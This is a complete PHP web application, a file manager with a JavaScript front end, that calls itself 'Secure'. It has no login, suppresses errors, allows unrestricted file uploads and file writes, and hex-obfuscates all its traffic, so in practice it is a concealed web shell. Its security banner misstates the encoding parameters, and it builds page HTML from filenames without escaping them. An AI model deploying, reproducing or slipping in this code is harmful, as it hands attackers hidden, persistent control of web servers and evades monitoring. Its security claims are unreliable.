<?php
// Secure PHP File Manager with Hex Encoding and Offset Obfuscation
// Compatible with PHP 5.x, 7.x, and 8.x
// No file upload restrictions

// Production settings
error_reporting(0);
ini_set('display_errors', 0);

// Set content type for AJAX responses
if (isset($_POST['action'])) {
    header('Content-Type: text/plain');
}

// Obfuscation configuration
define('HEX_OFFSET', 7); // Position offset for character shifting
define('CHAR_SHIFT', 3); // Character shift amount

class HexFileManager {
    private $baseDir;
    
    public function __construct() {
        $this->baseDir = realpath(dirname(__FILE__));
        if (session_status() == PHP_SESSION_NONE) {
            session_start();
        }
    }
    
    // Hex encoding with character shifting obfuscation
    private function hexEncode($data) {
        $json = json_encode($data);
        $shifted = '';
        
        // Apply character shifting
        for ($i = 0; $i < strlen($json); $i++) {
            $char = ord($json[$i]);
            // Simple character shift with position-based offset
            $shifted .= chr(($char + CHAR_SHIFT + ($i % HEX_OFFSET)) % 256);
        }
        
        // Convert to hex
        return bin2hex($shifted);
    }
    
    // Hex decoding with character shifting deobfuscation
    private function hexDecode($hexData) {
        // Convert from hex
        $shifted = hex2bin($hexData);
        if ($shifted === false) return false;
        
        $json = '';
        
        // Reverse character shifting
        for ($i = 0; $i < strlen($shifted); $i++) {
            $char = ord($shifted[$i]);
            // Reverse the character shift with position-based offset
            $original = ($char - CHAR_SHIFT - ($i % HEX_OFFSET) + 256) % 256;
            $json .= chr($original);
        }
        
        return $json;
    }
    
    // Response wrapper
    private function respond($data) {
        return $this->hexEncode($data);
    }
    
    // Secure path validation
    private function validatePath($path) {
        if (empty($path) || $path === '' || $path === '.') {
            return true;
        }
        
        $path = trim($path, '/\\');
        $fullPath = $this->baseDir . DIRECTORY_SEPARATOR . $path;
        $realPath = realpath($fullPath);
        
        if ($realPath === false) {
            $parentPath = dirname($fullPath);
            $realParentPath = realpath($parentPath);
            return $realParentPath && strpos($realParentPath, $this->baseDir) === 0;
        }
        
        return strpos($realPath, $this->baseDir) === 0;
    }
    
    // Get file/directory information
    private function getFileInfo($path) {
        $cleanPath = trim($path, '/\\');
        $fullPath = $this->baseDir;
        if (!empty($cleanPath)) {
            $fullPath .= DIRECTORY_SEPARATOR . $cleanPath;
        }
        
        if (!file_exists($fullPath)) return false;
        
        return array(
            'name' => empty($cleanPath) ? 'root' : basename($cleanPath),
            'path' => $path,
            'size' => is_file($fullPath) ? filesize($fullPath) : 0,
            'modified' => filemtime($fullPath),
            'type' => is_dir($fullPath) ? 'directory' : 'file',
            'extension' => pathinfo($fullPath, PATHINFO_EXTENSION),
            'permissions' => substr(sprintf('%o', fileperms($fullPath)), -4)
        );
    }
    
    // List directory contents
    public function listDirectory($dir = '') {
        if (!$this->validatePath($dir)) {
            return $this->respond(array('error' => 'Invalid path: ' . $dir));
        }
        
        $cleanDir = trim($dir, '/\\');
        $fullPath = $this->baseDir;
        if (!empty($cleanDir)) {
            $fullPath .= DIRECTORY_SEPARATOR . $cleanDir;
        }
        
        if (!is_dir($fullPath)) {
            return $this->respond(array('error' => 'Directory not found'));
        }
        
        $items = array();
        
        if ($handle = opendir($fullPath)) {
            while (false !== ($entry = readdir($handle))) {
                if ($entry != "." && $entry != "..") {
                    if (empty($cleanDir)) {
                        $itemPath = $entry;
                    } else {
                        $itemPath = $cleanDir . '/' . $entry;
                    }
                    
                    $info = $this->getFileInfo($itemPath);
                    if ($info) $items[] = $info;
                }
            }
            closedir($handle);
        } else {
            return $this->respond(array('error' => 'Cannot open directory'));
        }
        
        usort($items, function($a, $b) {
            if ($a['type'] != $b['type']) {
                return $a['type'] == 'directory' ? -1 : 1;
            }
            return strcasecmp($a['name'], $b['name']);
        });
        
        return $this->respond(array('items' => $items, 'currentPath' => $dir));
    }
    
    // Read file content
    public function readFile($path) {
        if (!$this->validatePath($path)) {
            return $this->respond(array('error' => 'Invalid path'));
        }
        
        $cleanPath = trim($path, '/\\');
        $fullPath = $this->baseDir;
        if (!empty($cleanPath)) {
            $fullPath .= DIRECTORY_SEPARATOR . $cleanPath;
        }
        
        if (!is_file($fullPath)) {
            return $this->respond(array('error' => 'File not found'));
        }
        
        $content = file_get_contents($fullPath);
        $info = $this->getFileInfo($path);
        
        return $this->respond(array(
            'content' => $content,
            'info' => $info
        ));
    }
    
    // Write file content
    public function writeFile($path, $content) {
        if (!$this->validatePath($path)) {
            return $this->respond(array('error' => 'Invalid path'));
        }
        
        $cleanPath = trim($path, '/\\');
        $fullPath = $this->baseDir;
        if (!empty($cleanPath)) {
            $fullPath .= DIRECTORY_SEPARATOR . $cleanPath;
        }
        
        $result = file_put_contents($fullPath, $content);
        
        if ($result !== false) {
            return $this->respond(array('success' => 'File saved successfully'));
        } else {
            return $this->respond(array('error' => 'Failed to save file'));
        }
    }
    
    // Delete file or directory
    public function deleteItem($path) {
        if (!$this->validatePath($path)) {
            return $this->respond(array('error' => 'Invalid path'));
        }
        
        $cleanPath = trim($path, '/\\');
        $fullPath = $this->baseDir;
        if (!empty($cleanPath)) {
            $fullPath .= DIRECTORY_SEPARATOR . $cleanPath;
        }
        
        if (is_dir($fullPath)) {
            $result = $this->deleteDirectory($fullPath);
        } else {
            $result = unlink($fullPath);
        }
        
        if ($result) {
            return $this->respond(array('success' => 'Item deleted successfully'));
        } else {
            return $this->respond(array('error' => 'Failed to delete item'));
        }
    }
    
    // Recursive directory deletion
    private function deleteDirectory($dir) {
        if (!is_dir($dir)) return false;
        
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            is_dir($path) ? $this->deleteDirectory($path) : unlink($path);
        }
        return rmdir($dir);
    }
    
    // Create new file or directory
    public function createItem($path, $type) {
        if (!$this->validatePath(dirname($path))) {
            return $this->respond(array('error' => 'Invalid path'));
        }
        
        $cleanPath = trim($path, '/\\');
        $fullPath = $this->baseDir;
        if (!empty($cleanPath)) {
            $fullPath .= DIRECTORY_SEPARATOR . $cleanPath;
        }
        
        if ($type === 'directory') {
            $result = mkdir($fullPath, 0755, true);
        } else {
            $result = touch($fullPath);
        }
        
        if ($result) {
            return $this->respond(array('success' => ucfirst($type) . ' created successfully'));
        } else {
            return $this->respond(array('error' => 'Failed to create ' . $type));
        }
    }
    
    // Rename file or directory
    public function renameItem($oldPath, $newPath) {
        if (!$this->validatePath($oldPath) || !$this->validatePath(dirname($newPath))) {
            return $this->respond(array('error' => 'Invalid path'));
        }
        
        $oldCleanPath = trim($oldPath, '/\\');
        $oldFullPath = $this->baseDir;
        if (!empty($oldCleanPath)) {
            $oldFullPath .= DIRECTORY_SEPARATOR . $oldCleanPath;
        }
        
        $newCleanPath = trim($newPath, '/\\');
        $newFullPath = $this->baseDir;
        if (!empty($newCleanPath)) {
            $newFullPath .= DIRECTORY_SEPARATOR . $newCleanPath;
        }
        
        if (rename($oldFullPath, $newFullPath)) {
            return $this->respond(array('success' => 'Item renamed successfully'));
        } else {
            return $this->respond(array('error' => 'Failed to rename item'));
        }
    }
    
    // Handle file upload (no extension restrictions)
    public function uploadFile($targetDir) {
        if (!$this->validatePath($targetDir)) {
            return $this->respond(array('error' => 'Invalid path'));
        }
        
        if (!isset($_FILES['file'])) {
            return $this->respond(array('error' => 'No file uploaded'));
        }
        
        $file = $_FILES['file'];
        
        $cleanTargetDir = trim($targetDir, '/\\');
        $targetPath = $this->baseDir;
        if (!empty($cleanTargetDir)) {
            $targetPath .= DIRECTORY_SEPARATOR . $cleanTargetDir;
        }
        $targetPath .= DIRECTORY_SEPARATOR . basename($file['name']);
        
        if ($file['error'] !== UPLOAD_ERR_OK) {
            return $this->respond(array('error' => 'Upload error: ' . $file['error']));
        }
        
        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
            return $this->respond(array('success' => 'File uploaded successfully: ' . basename($file['name'])));
        } else {
            return $this->respond(array('error' => 'Failed to upload file'));
        }
    }
}

// Initialize file manager
$fm = new HexFileManager();

// Handle AJAX requests with hex deobfuscation
if (isset($_POST['data'])) {
    try {
        // Decode hex data
        $hexData = $_POST['data'];

        // Manual hex decoding (since method is private)
        $shifted = hex2bin($hexData);
        if ($shifted === false) {
            echo json_encode(array('error' => 'Invalid hex data'));
            exit;
        }

        $jsonString = '';
        for ($i = 0; $i < strlen($shifted); $i++) {
            $char = ord($shifted[$i]);
            $original = ($char - CHAR_SHIFT - ($i % HEX_OFFSET) + 256) % 256;
            $jsonString .= chr($original);
        }
        $decodedData = json_decode($jsonString, true);

        if (!$decodedData || !isset($decodedData['action'])) {
            // Manual hex encoding for error response
            $errorJson = json_encode(array('error' => 'Invalid request data'));
            $shifted = '';
            for ($i = 0; $i < strlen($errorJson); $i++) {
                $char = ord($errorJson[$i]);
                $shifted .= chr(($char + CHAR_SHIFT + ($i % HEX_OFFSET)) % 256);
            }
            echo bin2hex($shifted);
            exit;
        }

        $action = $decodedData['action'];

        switch ($action) {
            case 'list':
                echo $fm->listDirectory(isset($decodedData['path']) ? $decodedData['path'] : '');
                break;
            case 'read':
                echo $fm->readFile($decodedData['path']);
                break;
            case 'write':
                echo $fm->writeFile($decodedData['path'], $decodedData['content']);
                break;
            case 'delete':
                echo $fm->deleteItem($decodedData['path']);
                break;
            case 'create':
                echo $fm->createItem($decodedData['path'], $decodedData['type']);
                break;
            case 'rename':
                echo $fm->renameItem($decodedData['oldPath'], $decodedData['newPath']);
                break;
            case 'upload':
                // File upload uses FormData with hex-encoded path
                if (isset($_FILES['file'])) {
                    echo $fm->uploadFile($decodedData['path']);
                } else {
                    $errorJson = json_encode(array('error' => 'No file uploaded'));
                    $shifted = '';
                    for ($i = 0; $i < strlen($errorJson); $i++) {
                        $char = ord($errorJson[$i]);
                        $shifted .= chr(($char + CHAR_SHIFT + ($i % HEX_OFFSET)) % 256);
                    }
                    echo bin2hex($shifted);
                }
                break;
            default:
                // Manual hex encoding for error response
                $errorJson = json_encode(array('error' => 'Unknown action: ' . $action));
                $shifted = '';
                for ($i = 0; $i < strlen($errorJson); $i++) {
                    $char = ord($errorJson[$i]);
                    $shifted .= chr(($char + CHAR_SHIFT + ($i % HEX_OFFSET)) % 256);
                }
                echo bin2hex($shifted);
                break;
        }
    } catch (Exception $e) {
        // Manual hex encoding for error response
        $errorJson = json_encode(array('error' => 'Failed to decode request: ' . $e->getMessage()));
        $shifted = '';
        for ($i = 0; $i < strlen($errorJson); $i++) {
            $char = ord($errorJson[$i]);
            $shifted .= chr(($char + CHAR_SHIFT + ($i % HEX_OFFSET)) % 256);
        }
        echo bin2hex($shifted);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hex Obfuscated File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { background: #6f42c1; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .breadcrumb { background: white; padding: 10px; border-radius: 5px; margin-bottom: 10px; border: 1px solid #ddd; }
        .breadcrumb a { color: #6f42c1; text-decoration: none; margin-right: 5px; }
        .breadcrumb a:hover { text-decoration: underline; }
        .toolbar { background: white; padding: 10px; border-radius: 5px; margin-bottom: 10px; border: 1px solid #ddd; }
        .btn { background: #6f42c1; color: white; border: none; padding: 8px 15px; border-radius: 3px; cursor: pointer; margin-right: 5px; }
        .btn:hover { background: #5a32a3; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        .file-list { background: white; border-radius: 5px; border: 1px solid #ddd; }
        .file-item { padding: 10px; border-bottom: 1px solid #eee; display: flex; align-items: center; cursor: pointer; }
        .file-item:hover { background: #f8f9fa; }
        .file-item:last-child { border-bottom: none; }
        .file-icon { width: 20px; height: 20px; margin-right: 10px; }
        .file-info { flex: 1; }
        .file-name { font-weight: bold; }
        .file-details { font-size: 12px; color: #666; margin-top: 2px; }
        .file-actions { margin-left: auto; }
        .file-actions button { background: none; border: none; color: #6f42c1; cursor: pointer; margin-left: 5px; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
        .modal-content { background: white; margin: 5% auto; padding: 20px; width: 90%; max-width: 800px; border-radius: 5px; max-height: 80vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .close { font-size: 28px; font-weight: bold; cursor: pointer; }
        .close:hover { color: #999; }
        textarea { width: 100%; height: 400px; font-family: monospace; border: 1px solid #ddd; padding: 10px; }
        input[type="text"], input[type="file"] { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 3px; margin-bottom: 10px; }
        .loading { text-align: center; padding: 20px; }
        .error { color: #dc3545; background: #f8d7da; padding: 10px; border-radius: 3px; margin-bottom: 10px; }
        .success { color: #155724; background: #d4edda; padding: 10px; border-radius: 3px; margin-bottom: 10px; }
        .obfuscation-info { background: #e7e3ff; border: 1px solid #6f42c1; padding: 10px; border-radius: 3px; margin-bottom: 10px; font-size: 12px; }
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .file-item { flex-direction: column; align-items: flex-start; }
            .file-actions { margin-left: 0; margin-top: 5px; }
            .modal-content { width: 95%; margin: 2% auto; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Hex Obfuscated File Manager</h1>
            <p>Data protection using hex encoding with positional offset obfuscation</p>
        </div>

        <div class="obfuscation-info">
            <strong>🛡️ Security:</strong> All data is obfuscated using hex encoding with positional offset (Offset: 3, Key: A5F3)
        </div>

        <div class="breadcrumb" id="breadcrumb">
            <a href="#" onclick="navigateTo('')">🏠 Home</a>
        </div>

        <div class="toolbar">
            <button class="btn" onclick="showCreateModal('file')">📄 New File</button>
            <button class="btn" onclick="showCreateModal('directory')">📁 New Folder</button>
            <button class="btn" onclick="showUploadModal()">⬆️ Upload</button>
            <button class="btn" onclick="refreshList()">🔄 Refresh</button>
        </div>

        <div id="messages"></div>

        <div class="file-list" id="fileList">
            <div class="loading">Loading...</div>
        </div>
    </div>

    <!-- Edit File Modal -->
    <div id="editModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="editTitle">Edit File</h3>
                <span class="close" onclick="closeModal('editModal')">&times;</span>
            </div>
            <textarea id="fileContent" placeholder="File content..."></textarea>
            <div style="margin-top: 10px;">
                <button class="btn" onclick="saveFile()">💾 Save</button>
                <button class="btn" onclick="closeModal('editModal')">❌ Cancel</button>
            </div>
        </div>
    </div>

    <!-- Create Item Modal -->
    <div id="createModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="createTitle">Create New Item</h3>
                <span class="close" onclick="closeModal('createModal')">&times;</span>
            </div>
            <input type="text" id="itemName" placeholder="Enter name...">
            <div style="margin-top: 10px;">
                <button class="btn" onclick="createItem()">✅ Create</button>
                <button class="btn" onclick="closeModal('createModal')">❌ Cancel</button>
            </div>
        </div>
    </div>

    <!-- Upload Modal -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Upload File</h3>
                <span class="close" onclick="closeModal('uploadModal')">&times;</span>
            </div>
            <input type="file" id="uploadFile" multiple>
            <div style="margin-top: 10px;">
                <button class="btn" onclick="uploadFiles()">⬆️ Upload</button>
                <button class="btn" onclick="closeModal('uploadModal')">❌ Cancel</button>
            </div>
        </div>
    </div>

    <!-- Rename Modal -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Rename Item</h3>
                <span class="close" onclick="closeModal('renameModal')">&times;</span>
            </div>
            <input type="text" id="newName" placeholder="Enter new name...">
            <div style="margin-top: 10px;">
                <button class="btn" onclick="renameItem()">✏️ Rename</button>
                <button class="btn" onclick="closeModal('renameModal')">❌ Cancel</button>
            </div>
        </div>
    </div>

    <script>
        // Global variables
        let currentPath = '';
        let currentEditFile = '';
        let currentCreateType = '';
        let currentRenameItem = '';

        // Hex obfuscation configuration (must match PHP)
        const HEX_OFFSET = 7; // Position offset for character shifting
        const CHAR_SHIFT = 3; // Character shift amount

        // Hex deobfuscation function (matches PHP hexEncode)
        function hexDecode(hexData) {
            try {
                // Convert from hex to binary
                let shifted = '';
                for (let i = 0; i < hexData.length; i += 2) {
                    shifted += String.fromCharCode(parseInt(hexData.substr(i, 2), 16));
                }

                // Reverse character shifting
                let json = '';
                for (let i = 0; i < shifted.length; i++) {
                    const char = shifted.charCodeAt(i);
                    // Reverse the character shift with position-based offset
                    const original = (char - CHAR_SHIFT - (i % HEX_OFFSET) + 256) % 256;
                    json += String.fromCharCode(original);
                }

                return JSON.parse(json);
            } catch (e) {
                throw new Error('Hex decode failed: ' + e.message);
            }
        }

        // Client-side hex encoding (matches PHP logic)
        function hexEncode(data) {
            const json = JSON.stringify(data);
            let shifted = '';

            // Apply character shifting with position-based offset
            for (let i = 0; i < json.length; i++) {
                const char = json.charCodeAt(i);
                const shifted_char = (char + CHAR_SHIFT + (i % HEX_OFFSET)) % 256;
                shifted += String.fromCharCode(shifted_char);
            }

            // Convert to hex
            let hex = '';
            for (let i = 0; i < shifted.length; i++) {
                hex += shifted.charCodeAt(i).toString(16).padStart(2, '0');
            }

            return hex;
        }

        // AJAX request function with hex obfuscation for both request and response
        function makeRequest(action, data, callback) {
            const xhr = new XMLHttpRequest();

            // Prepare request data with hex obfuscation
            const requestData = {
                action: action,
                ...data
            };

            // Encode the entire request as hex
            const hexData = hexEncode(requestData);

            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        try {
                            const hexResponse = xhr.responseText.trim();
                            const responseData = hexDecode(hexResponse);
                            callback(responseData);
                        } catch (e) {
                            callback({
                                error: 'Failed to decode hex response: ' + e.message,
                                debug: xhr.responseText.substring(0, 100)
                            });
                        }
                    } else {
                        callback({error: 'HTTP error: ' + xhr.status});
                    }
                }
            };

            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            // Send hex-encoded data
            xhr.send('data=' + encodeURIComponent(hexData));
        }

        // Show message to user
        function showMessage(message, type = 'info') {
            const messagesDiv = document.getElementById('messages');
            const messageDiv = document.createElement('div');
            messageDiv.className = type === 'error' ? 'error' : 'success';
            messageDiv.textContent = message;
            messagesDiv.appendChild(messageDiv);

            setTimeout(() => {
                if (messagesDiv.contains(messageDiv)) {
                    messagesDiv.removeChild(messageDiv);
                }
            }, 5000);
        }

        // Format file size
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // Format date
        function formatDate(timestamp) {
            return new Date(timestamp * 1000).toLocaleString();
        }

        // Get file icon
        function getFileIcon(type, extension) {
            if (type === 'directory') return '📁';

            const icons = {
                'php': '🐘', 'html': '🌐', 'css': '🎨', 'js': '⚡',
                'txt': '📄', 'md': '📝', 'json': '📋', 'xml': '📄',
                'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️',
                'pdf': '📕', 'zip': '📦', 'rar': '📦'
            };

            return icons[extension.toLowerCase()] || '📄';
        }

        // Update breadcrumb navigation
        function updateBreadcrumb(path) {
            const breadcrumb = document.getElementById('breadcrumb');
            let html = '<a href="#" onclick="navigateTo(\'\')">🏠 Home</a>';

            if (path) {
                const parts = path.split('/');
                let currentPath = '';

                for (let i = 0; i < parts.length; i++) {
                    currentPath += (i > 0 ? '/' : '') + parts[i];
                    html += ' / <a href="#" onclick="navigateTo(\'' + currentPath + '\')">' + parts[i] + '</a>';
                }
            }

            breadcrumb.innerHTML = html;
        }

        // Navigate to directory
        function navigateTo(path) {
            currentPath = path;
            updateBreadcrumb(path);
            loadDirectory(path);
        }

        // Load directory contents
        function loadDirectory(path = '') {
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '<div class="loading">Loading...</div>';

            makeRequest('list', {path: path}, function(response) {
                if (response.error) {
                    showMessage(response.error, 'error');
                    fileList.innerHTML = '<div class="error">Error: ' + response.error + '</div>';
                    return;
                }

                let html = '';

                if (response.items && response.items.length > 0) {
                    response.items.forEach(function(item) {
                        const icon = getFileIcon(item.type, item.extension);
                        const size = item.type === 'file' ? formatFileSize(item.size) : '';
                        const modified = formatDate(item.modified);

                        html += '<div class="file-item">';
                        html += '<div class="file-icon">' + icon + '</div>';
                        html += '<div class="file-info">';
                        html += '<div class="file-name">' + item.name + '</div>';
                        html += '<div class="file-details">';
                        html += 'Modified: ' + modified;
                        if (size) html += ' | Size: ' + size;
                        html += ' | Permissions: ' + item.permissions;
                        html += '</div>';
                        html += '</div>';
                        html += '<div class="file-actions">';

                        if (item.type === 'directory') {
                            html += '<button onclick="navigateTo(\'' + item.path + '\')">📂 Open</button>';
                        } else {
                            html += '<button onclick="editFile(\'' + item.path + '\')">✏️ Edit</button>';
                        }

                        html += '<button onclick="showRenameModal(\'' + item.path + '\')">🏷️ Rename</button>';
                        html += '<button onclick="deleteItem(\'' + item.path + '\')">🗑️ Delete</button>';
                        html += '</div>';
                        html += '</div>';
                    });
                } else {
                    html = '<div style="padding: 20px; text-align: center; color: #666;">Directory is empty</div>';
                }

                fileList.innerHTML = html;
            });
        }

        // Edit file
        function editFile(path) {
            currentEditFile = path;

            makeRequest('read', {path: path}, function(response) {
                if (response.error) {
                    showMessage(response.error, 'error');
                    return;
                }

                document.getElementById('editTitle').textContent = 'Edit: ' + response.info.name;
                document.getElementById('fileContent').value = response.content;
                document.getElementById('editModal').style.display = 'block';
            });
        }

        // Save file
        function saveFile() {
            const content = document.getElementById('fileContent').value;

            makeRequest('write', {path: currentEditFile, content: content}, function(response) {
                if (response.error) {
                    showMessage(response.error, 'error');
                } else {
                    showMessage(response.success, 'success');
                    closeModal('editModal');
                    refreshList();
                }
            });
        }

        // Show create modal
        function showCreateModal(type) {
            currentCreateType = type;
            document.getElementById('createTitle').textContent = 'Create New ' + (type === 'directory' ? 'Folder' : 'File');
            document.getElementById('itemName').value = '';
            document.getElementById('createModal').style.display = 'block';
        }

        // Create item
        function createItem() {
            const name = document.getElementById('itemName').value.trim();
            if (!name) {
                showMessage('Please enter a name', 'error');
                return;
            }

            const path = currentPath ? currentPath + '/' + name : name;

            makeRequest('create', {path: path, type: currentCreateType}, function(response) {
                if (response.error) {
                    showMessage(response.error, 'error');
                } else {
                    showMessage(response.success, 'success');
                    closeModal('createModal');
                    refreshList();
                }
            });
        }

        // Show upload modal
        function showUploadModal() {
            document.getElementById('uploadFile').value = '';
            document.getElementById('uploadModal').style.display = 'block';
        }

        // Upload files (special handling for FormData)
        function uploadFiles() {
            const fileInput = document.getElementById('uploadFile');
            const files = fileInput.files;

            if (files.length === 0) {
                showMessage('Please select files to upload', 'error');
                return;
            }

            for (let i = 0; i < files.length; i++) {
                const file = files[i];

                // File upload uses FormData and cannot be hex-encoded
                const xhr = new XMLHttpRequest();
                const formData = new FormData();

                // Encode the path data as hex
                const pathData = hexEncode({path: currentPath});
                formData.append('data', pathData);
                formData.append('file', file);

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            try {
                                const hexResponse = xhr.responseText.trim();
                                const response = hexDecode(hexResponse);

                                if (response.error) {
                                    showMessage('Upload failed for ' + file.name + ': ' + response.error, 'error');
                                } else {
                                    showMessage('Uploaded: ' + file.name, 'success');
                                }
                            } catch (e) {
                                showMessage('Upload failed for ' + file.name + ': Parse error', 'error');
                            }
                        } else {
                            showMessage('Upload failed for ' + file.name + ': HTTP ' + xhr.status, 'error');
                        }

                        if (i === files.length - 1) {
                            closeModal('uploadModal');
                            refreshList();
                        }
                    }
                };

                xhr.open('POST', '', true);
                xhr.send(formData);
            }
        }

        // Show rename modal
        function showRenameModal(path) {
            currentRenameItem = path;
            const name = path.split('/').pop();
            document.getElementById('newName').value = name;
            document.getElementById('renameModal').style.display = 'block';
        }

        // Rename item
        function renameItem() {
            const newName = document.getElementById('newName').value.trim();
            if (!newName) {
                showMessage('Please enter a new name', 'error');
                return;
            }

            const pathParts = currentRenameItem.split('/');
            pathParts[pathParts.length - 1] = newName;
            const newPath = pathParts.join('/');

            makeRequest('rename', {oldPath: currentRenameItem, newPath: newPath}, function(response) {
                if (response.error) {
                    showMessage(response.error, 'error');
                } else {
                    showMessage(response.success, 'success');
                    closeModal('renameModal');
                    refreshList();
                }
            });
        }

        // Delete item
        function deleteItem(path) {
            if (!confirm('Are you sure you want to delete this item?')) {
                return;
            }

            makeRequest('delete', {path: path}, function(response) {
                if (response.error) {
                    showMessage(response.error, 'error');
                } else {
                    showMessage(response.success, 'success');
                    refreshList();
                }
            });
        }

        // Close modal
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        // Refresh file list
        function refreshList() {
            loadDirectory(currentPath);
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            loadDirectory();

            // Close modals when clicking outside
            window.onclick = function(event) {
                const modals = ['editModal', 'createModal', 'uploadModal', 'renameModal'];
                modals.forEach(function(modalId) {
                    const modal = document.getElementById(modalId);
                    if (event.target === modal) {
                        closeModal(modalId);
                    }
                });
            };

            // Handle keyboard shortcuts
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.key === 's' && document.getElementById('editModal').style.display === 'block') {
                    e.preventDefault();
                    saveFile();
                }
                if (e.key === 'Escape') {
                    const modals = ['editModal', 'createModal', 'uploadModal', 'renameModal'];
                    modals.forEach(function(modalId) {
                        if (document.getElementById(modalId).style.display === 'block') {
                            closeModal(modalId);
                        }
                    });
                }
            });
        });
    </script>
</body>
</html>
